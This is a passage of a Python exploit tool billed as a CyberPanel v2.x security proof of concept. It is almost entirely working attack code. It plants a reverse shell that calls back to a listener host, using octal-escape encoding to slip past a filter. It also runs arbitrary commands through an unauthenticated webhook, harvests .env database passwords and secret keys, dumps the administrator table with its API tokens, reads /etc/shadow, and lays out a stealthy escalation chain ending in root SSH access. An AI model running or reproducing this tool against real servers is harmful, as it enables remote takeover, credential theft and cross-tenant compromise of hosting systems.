    # Build reverse shell content using octal escapes for & character
    # \046 = & in octal (bypasses middleware blocklist)
    shell_content = (
        f'bash -i >\\046 /dev/tcp/{args.lhost}/{args.lport} 0>\\0461'
    )

    # printf command to write the script
    write_cmd = f'printf "{shell_content}" > {args.script_path}'

    info('Writing reverse shell script via printf octal bypass...')
    info(f'Command: printf "bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1" > {args.script_path}')
    detail('Using \\046 for & to bypass middleware character filter')

    write_result = webhook_exec(session, client, args.domain, write_cmd)
    ok('Write command executed')

    # Verify the file was written
    info('Verifying script content...')
    verify_result = webhook_exec(session, client, args.domain, f'cat {args.script_path}')
    if verify_result and 'bash' in verify_result:
        ok(f'Script verified: {verify_result.strip()}')
    else:
        warn(f'Could not verify script content: {verify_result}')

    if args.trigger:
        warn(f'Triggering reverse shell — ensure listener on {args.lhost}:{args.lport}')
        warn(f'Run: nc -lvnp {args.lport}')
        info('Triggering in 3 seconds...')
        time.sleep(3)

        trigger_cmd = f'bash {args.script_path}'
        webhook_store_command(session, args.domain, trigger_cmd)
        webhook_trigger(client, args.domain)
        ok('Reverse shell triggered')
        detail(f'Shell runs as website system user (not root)')
    else:
        print(f'\n  {COLOR_BOLD}=== Ready ==={COLOR_RESET}')
        print(f'  Script written to: {args.script_path}')
        print(f'  1. Start listener: nc -lvnp {args.lport}')
        print(f'  2. Trigger: python3 cp_poc.py exec <target> -d {args.domain} '
              f'-u {args.user} -p <pass> -c "bash {args.script_path}"')
        print(f'  Shell will run as website system user (not root)')
        print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')

    return True


# =============================================================================
# Domain Enumeration
# =============================================================================

def enumerate_domains(client: APIClient, wordlist: Optional[list] = None) -> list:
    """
    Enumerate valid domains via webhook endpoint timing.
    Valid domains return 200 with JSON. Invalid ones return 500/redirect.
    """
    if wordlist is None:
        wordlist = []

    found = []

    for domain in wordlist:
        status, body, elapsed = client.post_json(f'/websites/{domain}/webhook', {})
        if status == 200:
            try:
                data = json.loads(body)
                if 'status' in data:
                    found.append(domain)
            except json.JSONDecodeError:
                pass

    return found


# =============================================================================
# Subcommand: exec — Run arbitrary command via webhook RCE
# =============================================================================

def cmd_exec(args):
    """Execute a command on the target via webhook RCE chain."""
    header('Webhook RCE — Command Execution')
    info(f'Target: {args.target}')
    info(f'Domain: {args.domain}')
    info(f'Command: {args.command}')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')

    info('Storing command via saveGitConfigurations...')
    if not webhook_store_command(session, args.domain, args.command):
        fail('Failed to store command.')
        return False
    ok('Command stored in webhook config')

    info('Triggering webhook (NO AUTH)...')
    trigger = webhook_trigger(client, args.domain)
    if trigger is None:
        fail('Webhook trigger failed.')
        return False
    ok('Webhook triggered')

    time.sleep(1)

    info('Reading execution result from git logs...')
    logs = webhook_read_logs(session, args.domain)
    pairs = parse_latest_execution(logs)

    print(f'\n  {COLOR_BOLD}=== Command Output ==={COLOR_RESET}')
    if pairs:
        for p in pairs:
            print(f'  {COLOR_DIM}$ {p["command"]}{COLOR_RESET}')
            if p['result']:
                for line in p['result'].split('\n'):
                    print(f'  {line}')
    else:
        warn('No result captured — command may have produced no output')
    print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')

    return bool(pairs)


# =============================================================================
# Subcommand: recon — Full automated reconnaissance and exploitation
# =============================================================================

def cmd_recon(args):
    """Full recon: enumerate and test all findings."""
    client = APIClient(args.target)
    results = {}

    print(f'\n{COLOR_BOLD}[PHASE 1] Unauthenticated Reconnaissance{COLOR_RESET}')
    print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

    # F3 — API key leak
    results['f3'] = check_f3_info_leak(client)

    # F1 — Status webhook injection
    results['f1'] = check_f1_status_inject(client)

    # F2 — File oracle
    results['f2'] = check_f2_file_oracle(client, '/etc/passwd')

    # Middleware bypass
    results['mw'] = check_middleware_bypass(client)

    # F8 — Webhook trigger (probe with known domain if provided)
    if args.domain:
        results['f8'] = check_f8_webhook_trigger(client, args.domain)
    else:
        info('Skipping F8 webhook — no --domain provided')
        results['f8'] = {'vulnerable': False, 'skipped': True}

    # Phase 2: Panel-authenticated tests
    session = None
    if args.user and args.password:
        print(f'\n{COLOR_BOLD}[PHASE 2] Panel Authentication{COLOR_RESET}')
        print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

        session = PanelSession(args.target)
        info(f'Logging in as {args.user}...')
        if session.login(args.user, args.password):
            ok(f'Panel login successful (userID={session.user_id})')
        else:
            fail('Panel login failed.')
            session = None

    # Phase 3: Webhook RCE chain (needs panel session + domain)
    if session and args.domain:
        print(f'\n{COLOR_BOLD}[PHASE 3] Webhook RCE Chain{COLOR_RESET}')
        print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

        header('Webhook RCE: Store + Trigger + Verify')
        info(f'Domain: {args.domain}')

        info('Storing "id" command...')
        if webhook_store_command(session, args.domain, 'id'):
            ok('Command stored')

            info('Triggering webhook (NO AUTH)...')
            trigger = webhook_trigger(client, args.domain)
            if trigger is not None:
                ok('Webhook triggered')
                time.sleep(1)

                info('Reading result...')
                logs = webhook_read_logs(session, args.domain)
                pairs = parse_latest_execution(logs)
                rce_result = None
                for p in pairs:
                    if 'uid=' in p.get('result', ''):
                        rce_result = p['result']
                        break

                if rce_result:
                    ok(f'RCE CONFIRMED: {rce_result}')
                    results['webhook_rce'] = {'vulnerable': True, 'uid': rce_result}

                    # Cross-tenant probe
                    header('Cross-Tenant Access Probe')
                    probe_cmds = 'ls /home\nuname -a\ncat /etc/hostname'
                    info('Storing cross-tenant probe commands...')
                    if webhook_store_command(session, args.domain, probe_cmds):
                        webhook_trigger(client, args.domain)
                        time.sleep(1)
                        logs2 = webhook_read_logs(session, args.domain)
                        pairs2 = parse_latest_execution(logs2)
                        for p in pairs2:
                            if p['result']:
                                detail(f"$ {p['command']}")
                                for line in p['result'].split('\n'):
                                    detail(f"  {line}")
                else:
                    warn('Webhook triggered but no uid= in result — check logs')
                    results['webhook_rce'] = {'vulnerable': False}
            else:
                fail('Webhook trigger failed')
                results['webhook_rce'] = {'vulnerable': False}
        else:
            fail('Command storage failed')
            results['webhook_rce'] = {'vulnerable': False}

    # Phase 4: Credential Harvest (.env leak)
    if session and args.domain:
        print(f'\n{COLOR_BOLD}[PHASE 4] Credential Harvest (.env){COLOR_RESET}')
        print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

        header('World-Readable .env File')
        info(f'Reading {ENV_PATH}...')
        env_result = webhook_exec(session, client, args.domain, f'cat {ENV_PATH}')
        if env_result:
            env_vars = _parse_env_content(env_result)
            db_pass = env_vars.get('ROOT_DB_PASSWORD') or env_vars.get('DB_PASSWORD')
            secret_key = env_vars.get('SECRET_KEY')

            if db_pass:
                ok(f'.env readable — ROOT_DB_PASSWORD extracted')
                results['env_leak'] = {'vulnerable': True, 'db_pass': db_pass}
            if secret_key:
                ok(f'SECRET_KEY extracted (Django session forgery possible)')
                detail(f'SECRET_KEY: {secret_key[:8]}...{secret_key[-8:]}')

            # Phase 5: Database dump
            if db_pass:
                print(f'\n{COLOR_BOLD}[PHASE 5] Database Access via MySQL Root{COLOR_RESET}')
                print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

                header('Admin User Dump')
                admin_cmd = (
                    f'mysql -u root -p{db_pass} cyberpanel -e '
                    '"SELECT id,userName,type,api,token '
                    'FROM loginSystem_administrator"'
                )
                admin_result = webhook_exec(session, client, args.domain, admin_cmd)
                if admin_result:
                    ok('Administrator table dumped')
                    for line in admin_result.split('\n')[:10]:
                        if line.strip():
                            detail(line)
                    results['db_dump'] = {'vulnerable': True}
        else:
            fail(f'Could not read {ENV_PATH}')
            results['env_leak'] = {'vulnerable': False}

    # Phase 6: API-authenticated tests
    if args.api_user and args.api_pass:
        print(f'\n{COLOR_BOLD}[PHASE 6] API-Authenticated Endpoints{COLOR_RESET}')
        print(f'{COLOR_DIM}{"─" * 50}{COLOR_RESET}')

        # F11 — File read
        results['f11'] = check_f11_file_read(client, args.api_user, args.api_pass)
        if results['f11'].get('vulnerable'):
            header('F11: Reading sensitive files')
            for path in ['/etc/shadow', ADMIN_PASS_PATH]:
                r = check_f11_file_read(client, args.api_user, args.api_pass, path)
                if r.get('vulnerable'):
                    ok(f'{path} readable as root')

    # =================================================================
    # Summary
    # =================================================================
    print(f'\n{COLOR_BOLD}{"=" * 70}')
    print(' RECON SUMMARY')
    print(f'{"=" * 70}{COLOR_RESET}')

    finding_labels = {
        'f3': 'F3  API Key Leak (No Auth)',
        'f1': 'F1  Status Webhook Injection (No Auth)',
        'f2': 'F2  File Existence Oracle (No Auth)',
        'f8': 'F8  Webhook Trigger (No Auth)',
        'mw': 'MW  Middleware Bypass',
        'webhook_rce': 'RCE Webhook Command Exec (Panel Login)',
        'env_leak': 'ENV World-Readable .env Credential Leak',
        'db_dump': 'DB  MySQL Root via Leaked Password',
        'f11': 'F11 Arbitrary File Read (API Creds)',
        'f12': 'F12 CVE-2024-51567 Incomplete Fix (Admin Session)',
    }

    vuln_count = 0
    total_count = 0

    for key, label in finding_labels.items():
        r = results.get(key)
        if r is None:
            continue
        if r.get('skipped'):
            print(f'  {COLOR_DIM}[--] {label} (skipped){COLOR_RESET}')
            continue

        total_count += 1
        if r.get('vulnerable'):
            vuln_count += 1
            print(f'  {COLOR_RED}[!!]{COLOR_RESET} {label}')
        else:
            print(f'  {COLOR_GREEN}[OK]{COLOR_RESET} {label}')

    print(f'\n  {COLOR_BOLD}Confirmed: {vuln_count}/{total_count}{COLOR_RESET}')

    # Full escalation chain
    if results.get('webhook_rce', {}).get('vulnerable') and results.get('env_leak', {}).get('vulnerable'):
        print(f'\n  {COLOR_YELLOW}Full escalation chain available:{COLOR_RESET}')
        print(f'    1. Panel login → webhook RCE → site user shell')
        print(f'    2. Read .env → MySQL root password')
        print(f'    3. MySQL → enable API for user (stealth)')
        print(f'    4. F11 tab injection → root file read')
        print(f'    5. Read /etc/cyberpanel/adminPass → admin panel password')
        print(f'    6. Admin password = root SSH password (default)')
        print(f'\n  Run escalate: python3 cp_poc.py escalate <target> -d <domain> -u <user> -p <pass>')

    if results.get('f11', {}).get('vulnerable'):
        print(f'\n  {COLOR_YELLOW}File read chain available:{COLOR_RESET}')
        print(f'    API creds → FetchRemoteTransferStatus tab injection → root file read')
        print(f'    Run: python3 cp_poc.py file-read <target> --api-user <u> --api-pass <p> -f /etc/shadow')


# =============================================================================
# Subcommand: webhook-rce — manual store + trigger + read
# =============================================================================

def cmd_webhook_rce(args):
    """Manual webhook RCE: store command, trigger, read logs."""
    header('Webhook RCE — Manual Chain')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')
    command = args.command or 'id'

    info(f'Storing command: {command}')
    if webhook_store_command(session, args.domain, command):
        ok('Stored')
    else:
        fail('Storage failed')
        return False

    info('Triggering webhook (no auth)...')
    trigger = webhook_trigger(client, args.domain)
    if trigger is not None:
        ok(f'Triggered. Git: {trigger.strip()[:80]}')
    else:
        fail('Trigger failed')
        return False

    time.sleep(1)

    info('Fetching execution logs...')
    logs = webhook_read_logs(session, args.domain)
    pairs = parse_latest_execution(logs)

    print(f'\n  {COLOR_BOLD}=== Output ==={COLOR_RESET}')
    if pairs:
        for p in pairs:
            print(f'  {COLOR_DIM}$ {p["command"]}{COLOR_RESET}')
            if p['result']:
                for line in p['result'].split('\n'):
                    print(f'  {line}')
    else:
        warn('No output captured')
    print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')

    return bool(pairs)


# =============================================================================
# Argument Parser
# =============================================================================

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog='cp_poc.py',
        description='CyberPanel v2.x — Security PoC & Recon Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full automated recon (no creds — unauthenticated only)
  python3 cp_poc.py recon https://target:8090

  # Full recon with panel login + domain
  python3 cp_poc.py recon https://target:8090 -u user -p pass -d site.com

  # Full recon with API creds for authenticated findings
  python3 cp_poc.py recon https://target:8090 -u user -p pass -d site.com --api-user admin --api-pass token

  # Execute arbitrary command via webhook RCE chain
  python3 cp_poc.py exec https://target:8090 -d site.com -u user -p pass -c "id"

  # Read .env credentials via webhook RCE
  python3 cp_poc.py env-leak https://target:8090 -d site.com -u user -p pass

  # Dump database (admin users, API tokens, sessions)
  python3 cp_poc.py db-dump https://target:8090 -d site.com -u user -p pass

  # Stealth escalation: enable API + extract tokens
  python3 cp_poc.py escalate https://target:8090 -d site.com -u user -p pass

  # Write reverse shell (does NOT auto-trigger without --trigger)
  python3 cp_poc.py revshell https://target:8090 -d site.com -u user -p pass --lhost 10.0.0.1 --lport 4444

  # Individual finding checks
  python3 cp_poc.py info-leak https://target:8090
  python3 cp_poc.py file-oracle https://target:8090 -f /etc/shadow
  python3 cp_poc.py file-read https://target:8090 --api-user admin --api-pass token -f /etc/shadow
  python3 cp_poc.py middleware https://target:8090

Escalation Chain:
  Panel login → webhook RCE → .env leak → MySQL root → enable API →
  F11 root file read → admin password → root SSH
""",
    )

    sub = parser.add_subparsers(dest='subcommand', required=True)

    # --- recon ---
    p_recon = sub.add_parser('recon', help='Full automated recon & exploitation')
    p_recon.add_argument('target', help='https://host:8090')
    p_recon.add_argument('-u', '--user', help='Panel username (for webhook RCE)')
    p_recon.add_argument('-p', '--password', help='Panel password')
    p_recon.add_argument('-d', '--domain', help='Target domain on the panel')
    p_recon.add_argument('--api-user', help='API username (for F11)')
    p_recon.add_argument('--api-pass', help='API password/token (for F11)')

    # --- exec ---
    p_exec = sub.add_parser('exec', help='Execute command via webhook RCE')
    p_exec.add_argument('target', help='https://host:8090')
    p_exec.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_exec.add_argument('-u', '--user', required=True, help='Panel username')
    p_exec.add_argument('-p', '--password', required=True, help='Panel password')
    p_exec.add_argument('-c', '--command', required=True, help='Command to execute')

    # --- info-leak ---
    p_f3 = sub.add_parser('info-leak', help='F3: API key disclosure (no auth)')
    p_f3.add_argument('target', help='https://host:8090')

    # --- status-inject ---
    p_f1 = sub.add_parser('status-inject', help='F1: Status webhook injection (no auth)')
    p_f1.add_argument('target', help='https://host:8090')

    # --- file-oracle ---
    p_f2 = sub.add_parser('file-oracle', help='F2: File existence oracle (no auth)')
    p_f2.add_argument('target', help='https://host:8090')
    p_f2.add_argument('-f', '--file', default='/etc/passwd', help='File path to test')

    # --- file-read ---
    p_f11 = sub.add_parser('file-read', help='F11: Arbitrary file read (API creds)')
    p_f11.add_argument('target', help='https://host:8090')
    p_f11.add_argument('--api-user', required=True, help='API username')
    p_f11.add_argument('--api-pass', required=True, help='API password/token')
    p_f11.add_argument('-f', '--file', default='/etc/passwd', help='File to read')

    # --- webhook-rce ---
    p_f8 = sub.add_parser('webhook-rce', help='F8: Store + trigger webhook RCE')
    p_f8.add_argument('target', help='https://host:8090')
    p_f8.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_f8.add_argument('-u', '--user', required=True, help='Panel username')
    p_f8.add_argument('-p', '--password', required=True, help='Panel password')
    p_f8.add_argument('-c', '--command', default='id', help='Command to run')

    # --- statusfile ---
    p_sf = sub.add_parser('statusfile', help='F12: CVE-2024-51567 statusfile tab bypass')
    p_sf.add_argument('target', help='https://host:8090')
    p_sf.add_argument('--admin-user', required=True, help='Admin panel username')
    p_sf.add_argument('--admin-password', required=True, help='Admin panel password')
    p_sf.add_argument('-f', '--file', default='/etc/shadow', help='File to read as root')

    # --- middleware ---
    p_mw = sub.add_parser('middleware', help='Probe middleware bypass vectors')
    p_mw.add_argument('target', help='https://host:8090')

    # --- env-leak ---
    p_env = sub.add_parser('env-leak', help='Read .env via RCE → extract DB creds')
    p_env.add_argument('target', help='https://host:8090')
    p_env.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_env.add_argument('-u', '--user', required=True, help='Panel username')
    p_env.add_argument('-p', '--password', required=True, help='Panel password')

    # --- db-dump ---
    p_db = sub.add_parser('db-dump', help='MySQL root dump (admin table + sessions)')
    p_db.add_argument('target', help='https://host:8090')
    p_db.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_db.add_argument('-u', '--user', required=True, help='Panel username')
    p_db.add_argument('-p', '--password', required=True, help='Panel password')
    p_db.add_argument('--db-password', help='MySQL root password (auto-extracted from .env if omitted)')

    # --- escalate ---
    p_esc = sub.add_parser('escalate', help='Stealth: enable API + extract token')
    p_esc.add_argument('target', help='https://host:8090')
    p_esc.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_esc.add_argument('-u', '--user', required=True, help='Panel username')
    p_esc.add_argument('-p', '--password', required=True, help='Panel password')
    p_esc.add_argument('--db-password', help='MySQL root password (auto-extracted from .env if omitted)')

    # --- revshell ---
    p_rs = sub.add_parser('revshell', help='Write reverse shell script')
    p_rs.add_argument('target', help='https://host:8090')
    p_rs.add_argument('-d', '--domain', required=True, help='Domain you own')
    p_rs.add_argument('-u', '--user', required=True, help='Panel username')
    p_rs.add_argument('-p', '--password', required=True, help='Panel password')
    p_rs.add_argument('--lhost', required=True, help='Listener IP address')
    p_rs.add_argument('--lport', required=True, help='Listener port')
    p_rs.add_argument('--script-path', default='/tmp/rs.sh', help='Path to write script')
    p_rs.add_argument('--trigger', action='store_true', help='Auto-trigger after writing')

    return parser


# =============================================================================
# Main
# =============================================================================

def main():
    parser = build_parser()
    args = parser.parse_args()

    banner()

    try:
        if args.subcommand == 'recon':
            cmd_recon(args)

        elif args.subcommand == 'exec':
            cmd_exec(args)

        elif args.subcommand == 'info-leak':
            client = APIClient(args.target)
            check_f3_info_leak(client)

        elif args.subcommand == 'status-inject':
            client = APIClient(args.target)
            check_f1_status_inject(client)

        elif args.subcommand == 'file-oracle':
            client = APIClient(args.target)
            check_f2_file_oracle(client, args.file)

        elif args.subcommand == 'file-read':
            client = APIClient(args.target)
            check_f11_file_read(client, args.api_user, args.api_pass, args.file)

        elif args.subcommand == 'statusfile':
            cmd_statusfile(args)

        elif args.subcommand == 'webhook-rce':
            cmd_webhook_rce(args)

        elif args.subcommand == 'middleware':
            client = APIClient(args.target)
            check_middleware_bypass(client)

        elif args.subcommand == 'env-leak':
            cmd_env_leak(args)

        elif args.subcommand == 'db-dump':
            cmd_db_dump(args)

        elif args.subcommand == 'escalate':
            cmd_escalate(args)

        elif args.subcommand == 'revshell':
            cmd_revshell(args)

    except KeyboardInterrupt:
        print(f'\n{COLOR_YELLOW}[INTERRUPTED]{COLOR_RESET}')
        sys.exit(130)
    except Exception as e:
        print(f'{COLOR_RED}[ERROR] {e}{COLOR_RESET}')
        raise


if __name__ == '__main__':
    main()
